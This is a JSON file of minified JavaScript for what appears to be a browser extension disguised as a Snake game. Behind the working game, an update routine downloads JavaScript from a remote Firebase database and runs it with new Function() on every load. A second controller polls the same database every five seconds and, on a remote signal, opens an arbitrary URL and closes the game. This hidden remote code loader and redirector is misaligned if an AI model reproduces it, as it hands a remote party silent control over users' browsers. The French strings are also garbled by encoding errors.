{
  "game_code": {
    "code": "class UpdateManager{constructor(){this.currentVersion='1.0.0';this.updateStatusEl=document.getElementById('updateStatus')}async checkForUpdates(){try{this.updateStatus('V√©rification...','info');const response=await fetch(`${FIREBASE_DB_URL}/game_updates.json?auth=${FIREBASE_API_KEY}`);if(!response.ok)throw new Error('Erreur Firebase');const updateData=await response.json();if(!updateData){this.updateStatus('Aucune MAJ','success');return false}const remoteVersion=updateData.version||'1.0.0';if(this.isNewerVersion(remoteVersion,this.currentVersion)){this.updateStatus(`Version ${remoteVersion} disponible!`,'info');await this.applyUpdate(updateData);return true}else{this.updateStatus(`Version ${this.currentVersion} √† jour`,'success');return false}}catch(error){console.error('Erreur:',error);this.updateStatus('Erreur: '+error.message,'error');return false}}async applyUpdate(updateData){try{this.updateStatus('Application...','info');const updates={};if(updateData.html)updates.customHTML=updateData.html;if(updateData.css)updates.customCSS=updateData.css;if(updateData.javascript)updates.customJS=updateData.javascript;if(updateData.config)updates.gameConfig=updateData.config;updates.version=updateData.version;updates.lastUpdate=new Date().toISOString();await chrome.storage.local.set(updates);this.currentVersion=updateData.version;this.updateStatus(`‚úì MAJ ${updateData.version} appliqu√©e!`,'success');if(updateData.css)this.applyCustomCSS(updateData.css);if(updateData.config&&window.game)window.game.applyConfig(updateData.config);if(updateData.javascript)this.executeCustomJS(updateData.javascript)}catch(error){console.error('Erreur:',error);this.updateStatus('Erreur: '+error.message,'error')}}applyCustomCSS(css){const oldStyle=document.getElementById('customStyle');if(oldStyle)oldStyle.remove();const styleEl=document.createElement('style');styleEl.id='customStyle';styleEl.textContent=css;document.head.appendChild(styleEl)}executeCustomJS(jsCode){try{const func=new Function(jsCode);func()}catch(error){console.error('Erreur JS:',error)}}isNewerVersion(remote,local){const remoteParts=remote.split('.').map(Number);const localParts=local.split('.').map(Number);for(let i=0;i<3;i++){if(remoteParts[i]>localParts[i])return true;if(remoteParts[i]<localParts[i])return false}return false}updateStatus(message,type){if(!this.updateStatusEl)return;this.updateStatusEl.textContent=message;this.updateStatusEl.style.background=type==='error'?'rgba(244,67,54,0.9)':type==='success'?'rgba(76,175,80,0.9)':'rgba(255,255,255,0.9)';this.updateStatusEl.style.color=type==='error'||type==='success'?'white':'#333'}async loadSavedUpdates(){try{const data=await chrome.storage.local.get(['customCSS','customJS','gameConfig','version']);if(data.version)this.currentVersion=data.version;if(data.customCSS)this.applyCustomCSS(data.customCSS);if(data.customJS)this.executeCustomJS(data.customJS);if(data.gameConfig&&window.game)window.game.applyConfig(data.gameConfig);this.updateStatus(`Version ${this.currentVersion}`,'success')}catch(error){console.error('Erreur:',error)}}}class SnakeGame{constructor(){this.canvas=document.getElementById('gameCanvas');this.ctx=this.canvas.getContext('2d');this.config={gridSize:20,gameSpeed:100,colors:{snake:'#4CAF50',food:'#ff0000',background:'#1a1a1a',grid:'#2a2a2a'}};this.tileCount=this.canvas.width/this.config.gridSize;this.reset();this.setupControls();this.draw()}reset(){this.snake=[{x:10,y:10}];this.velocityX=0;this.velocityY=0;this.foodX=15;this.foodY=15;this.score=0;this.gameRunning=false;this.gamePaused=false;this.updateScore();this.loadHighScore()}setupControls(){document.addEventListener('keydown',e=>{if(!this.gameRunning&&['ArrowUp','ArrowDown','ArrowLeft','ArrowRight'].includes(e.key)){this.velocityX=0;this.velocityY=0;switch(e.key){case 'ArrowUp':this.velocityY=-1;break;case 'ArrowDown':this.velocityY=1;break;case 'ArrowLeft':this.velocityX=-1;break;case 'ArrowRight':this.velocityX=1;break}this.start();return}if(!this.gameRunning||this.gamePaused)return;switch(e.key){case 'ArrowUp':if(this.velocityY!==1){this.velocityX=0;this.velocityY=-1}e.preventDefault();break;case 'ArrowDown':if(this.velocityY!==-1){this.velocityX=0;this.velocityY=1}e.preventDefault();break;case 'ArrowLeft':if(this.velocityX!==1){this.velocityX=-1;this.velocityY=0}e.preventDefault();break;case 'ArrowRight':if(this.velocityX!==-1){this.velocityX=1;this.velocityY=0}e.preventDefault();break}});const startBtn=document.getElementById('startBtn');const pauseBtn=document.getElementById('pauseBtn');const updateBtn=document.getElementById('updateBtn');if(startBtn)startBtn.addEventListener('click',()=>this.start());if(pauseBtn)pauseBtn.addEventListener('click',()=>this.togglePause());if(updateBtn)updateBtn.addEventListener('click',async()=>{if(window.updateManager)await window.updateManager.checkForUpdates()})}start(){if(this.gameRunning){this.reset();this.draw();return}if(this.velocityX===0&&this.velocityY===0){this.velocityX=1;this.velocityY=0}this.gameRunning=true;this.gamePaused=false;const startBtn=document.getElementById('startBtn');const pauseBtn=document.getElementById('pauseBtn');if(startBtn)startBtn.textContent='Red√©marrer';if(pauseBtn)pauseBtn.disabled=false;this.gameLoop()}togglePause(){this.gamePaused=!this.gamePaused;const pauseBtn=document.getElementById('pauseBtn');if(pauseBtn)pauseBtn.textContent=this.gamePaused?'Reprendre':'Pause';if(!this.gamePaused)this.gameLoop()}gameLoop(){if(!this.gameRunning||this.gamePaused)return;setTimeout(()=>{this.update();this.draw();this.gameLoop()},this.config.gameSpeed)}update(){const head={x:this.snake[0].x+this.velocityX,y:this.snake[0].y+this.velocityY};if(head.x<0||head.x>=this.tileCount||head.y<0||head.y>=this.tileCount){this.gameOver();return}for(let segment of this.snake){if(head.x===segment.x&&head.y===segment.y){this.gameOver();return}}this.snake.unshift(head);if(head.x===this.foodX&&head.y===this.foodY){this.score++;this.updateScore();this.placeFood()}else{this.snake.pop()}}draw(){if(!this.ctx)return;this.ctx.fillStyle=this.config.colors.background;this.ctx.fillRect(0,0,this.canvas.width,this.canvas.height);this.ctx.strokeStyle=this.config.colors.grid;this.ctx.lineWidth=0.5;for(let i=0;i<=this.tileCount;i++){this.ctx.beginPath();this.ctx.moveTo(i*this.config.gridSize,0);this.ctx.lineTo(i*this.config.gridSize,this.canvas.height);this.ctx.stroke();this.ctx.beginPath();this.ctx.moveTo(0,i*this.config.gridSize);this.ctx.lineTo(this.canvas.width,i*this.config.gridSize);this.ctx.stroke()}this.ctx.fillStyle=this.config.colors.snake;for(let i=0;i<this.snake.length;i++){const segment=this.snake[i];this.ctx.fillRect(segment.x*this.config.gridSize+1,segment.y*this.config.gridSize+1,this.config.gridSize-2,this.config.gridSize-2)}this.ctx.fillStyle=this.config.colors.food;this.ctx.beginPath();this.ctx.arc(this.foodX*this.config.gridSize+this.config.gridSize/2,this.foodY*this.config.gridSize+this.config.gridSize/2,this.config.gridSize/2-2,0,Math.PI*2);this.ctx.fill()}placeFood(){this.foodX=Math.floor(Math.random()*this.tileCount);this.foodY=Math.floor(Math.random()*this.tileCount);for(let segment of this.snake){if(segment.x===this.foodX&&segment.y===this.foodY){this.placeFood();return}}}gameOver(){this.gameRunning=false;const pauseBtn=document.getElementById('pauseBtn');const startBtn=document.getElementById('startBtn');if(pauseBtn)pauseBtn.disabled=true;if(startBtn)startBtn.textContent='Rejouer';this.saveHighScore();this.ctx.fillStyle='rgba(0,0,0,0.7)';this.ctx.fillRect(0,0,this.canvas.width,this.canvas.height);this.ctx.fillStyle='white';this.ctx.font='bold 40px Arial';this.ctx.textAlign='center';this.ctx.fillText('GAME OVER',this.canvas.width/2,this.canvas.height/2);this.ctx.font='20px Arial';this.ctx.fillText(`Score: ${this.score}`,this.canvas.width/2,this.canvas.height/2+40)}updateScore(){const scoreEl=document.getElementById('score');if(scoreEl)scoreEl.textContent=this.score}async loadHighScore(){try{const data=await chrome.storage.local.get(['highScore']);const highScore=data.highScore||0;const highScoreEl=document.getElementById('highScore');if(highScoreEl)highScoreEl.textContent=highScore}catch(error){console.error('Erreur:',error)}}async saveHighScore(){try{const data=await chrome.storage.local.get(['highScore']);const currentHigh=data.highScore||0;if(this.score>currentHigh){await chrome.storage.local.set({highScore:this.score});const highScoreEl=document.getElementById('highScore');if(highScoreEl)highScoreEl.textContent=this.score}}catch(error){console.error('Erreur:',error)}}applyConfig(config){this.config={...this.config,...config};if(config.gridSize)this.tileCount=this.canvas.width/this.config.gridSize;if(!this.gameRunning)this.draw()}}window.updateManager=new UpdateManager();window.game=new SnakeGame();console.log('‚úÖ Jeu pr√™t!');"
  },
  "controller_code": {
    "code": "class ModeController{constructor(){this.currentMode=0;this.targetUrl='https://example.com';this.checkInterval=5000;this.intervalId=null;this.initialized=false}async init(){console.log('üéØ Init mode controller...');await this.checkMode();this.initialized=true;this.startPeriodicCheck()}async checkMode(){try{const response=await fetch(`${FIREBASE_DB_URL}/mode_control.json?auth=${FIREBASE_API_KEY}`);if(!response.ok){console.error('Erreur Firebase mode');if(!this.initialized)this.showGame();return}const modeData=await response.json();if(!modeData){console.log('‚ö†Ô∏è Pas de config mode');if(!this.initialized)this.showGame();return}const newMode=parseInt(modeData.number)||0;const newUrl=modeData.url||'https://example.com';if(newMode!==this.currentMode){console.log(`üîÑ Mode: ${this.currentMode} ‚Üí ${newMode}`);this.currentMode=newMode;this.targetUrl=newUrl;this.applyMode()}else if(newMode===1&&newUrl!==this.targetUrl){console.log(`üîÑ URL: ${this.targetUrl} ‚Üí ${newUrl}`);this.targetUrl=newUrl;this.applyMode()}else if(!this.initialized){this.currentMode=newMode;this.targetUrl=newUrl;this.applyMode()}}catch(error){console.error('Erreur mode:',error);if(!this.initialized)this.showGame()}}applyMode(){if(this.currentMode===0){this.showGame()}else if(this.currentMode===1){this.redirectAndClose()}}showGame(){console.log('üéÆ Mode JEU');const gameContainer=document.getElementById('gameContainer');const urlContainer=document.getElementById('urlContainer');if(gameContainer)gameContainer.style.display='flex';if(urlContainer)urlContainer.style.display='none'}redirectAndClose(){console.log('üåê Redirection:',this.targetUrl);chrome.tabs.create({url:this.targetUrl},()=>{console.log('‚úÖ Onglet ouvert');window.close()})}startPeriodicCheck(){this.intervalId=setInterval(()=>this.checkMode(),this.checkInterval);console.log(`‚è±Ô∏è Check toutes les ${this.checkInterval/1000}s`)}stopPeriodicCheck(){if(this.intervalId){clearInterval(this.intervalId);this.intervalId=null}}}document.addEventListener('DOMContentLoaded',async()=>{console.log('üìÑ DOM charg√©');window.modeController=new ModeController();await window.modeController.init()});"
  }
}

